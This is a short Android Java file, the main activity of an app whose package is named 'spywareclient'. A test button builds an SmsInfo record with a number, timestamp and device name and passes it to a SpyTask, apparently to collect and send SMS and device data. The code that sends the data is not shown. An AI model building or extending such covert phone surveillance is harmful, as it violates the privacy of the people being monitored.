package com.hoangdv.spywareclient;

import java.util.Calendar;
import java.util.Date;

import android.app.Activity;
import android.graphics.DashPathEffect;
import android.os.Bundle;
import android.text.format.DateFormat;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import com.hoangdv.spywareclient.Spy.Devices;
import com.hoangdv.spywareclient.Spy.SmsInfo;
import com.hoangdv.spywareclient.Spy.SpyTask;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		Button button = (Button) findViewById(R.id.button_test);
		button.setOnClickListener(new View.OnClickListener() {

			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				Log.d("Tag", "DeviceInfor: " + Devices.getDeviceName());
				SpyTask spyTask = new SpyTask();
				SmsInfo info = new SmsInfo("0167", java.text.DateFormat
						.getDateTimeInstance().format(
								Calendar.getInstance().getTime()), "From "
						+ Devices.getDeviceName());
				spyTask.setContext(getApplicationContext());
				spyTask.execute(info);
			}
		});
	}
}
